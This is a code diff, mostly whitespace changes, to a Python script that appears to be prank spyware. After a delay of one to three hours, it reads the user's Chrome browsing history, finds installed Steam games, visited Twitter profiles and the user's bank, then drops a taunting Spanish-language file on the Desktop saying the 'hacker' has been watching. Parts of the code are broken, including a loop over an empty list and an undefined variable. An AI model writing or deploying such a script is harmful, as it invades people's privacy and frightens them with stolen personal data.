@@ -1,44 +1,72 @@
 # Check_history_of_Google
 
 import os
+
 from pathlib import Path
+
 from shutil import copyfile
+
 from time import sleep
+
 from random import randrange
+
 import sqlite3
+
 import re
+
 import glob
 
+
 HACKER_FILE_NAME = "PARA TI.txt"
+
 
 
 def get_user_path():
     return "{}/".format(Path.home())
 
 
+
 def check_steam_games(hacker_file):
+
     steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
+    
     games = []
+    
     games_paths = glob.glob(steam_path)
+    
     games_paths.sort(key=len, reverse=True)
+    
     for game in games:
+    
         games.append(game_path.split("\\")[-1])
+        
     hacker_file.write("He visto que ultimamente has estado jugando a {}".format(",".join(games[:3])))
+    
 
 
 def delay_action():
+
     n_hours = randrange(1, 4)
+    
+   
     print("Durmiendo {} horas".format(n_hours))
+    
     sleep(n_hours * 60 * 60)
+    
 
 
 def create_hacker_file(user_path):
+
     hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
+    
     hacker_file.write("Bon dia\n")
+    
     return hacker_file
+    
 
 
 def get_chrome_history(user_path):
+
     urls = None
     while not urls:
         try:
@@ -57,7 +85,9 @@ def get_chrome_history(user_path):
             sleep(3)
 
 
+
 def check_twitter_profiles(hacker_file, chrome_history):
+
     profiles_visited = []
     for item in chrome_history:
         print(item[2])
@@ -67,7 +97,9 @@ def check_twitter_profiles(hacker_file, chrome_history):
         hacker_file.write("He visto que has estado  husmeando en los perfiles de {}...\n".format(",".join(profiles_visited)))
 
 
+
 def check_bank_account(hacker_file, chrome_history):
+
     his_bank = None
     banks = ["BBVA", "Santander", "Caixa Bank", "Bankia", "Sabadell", "Kutxabank", "Abanca", "Unicaja Banco", "Ibercaja"]
     for item in chrome_history:
@@ -81,7 +113,9 @@ def check_bank_account(hacker_file, chrome_history):
     print("his_bank")
 
 
+
 def main():
+
     # Wait 1-3 hours
     delay_action()
     # Calculate the field to Windows's user
@@ -99,4 +133,5 @@ def main():
 
 
 if __name__ == "__main__":
+
     main()
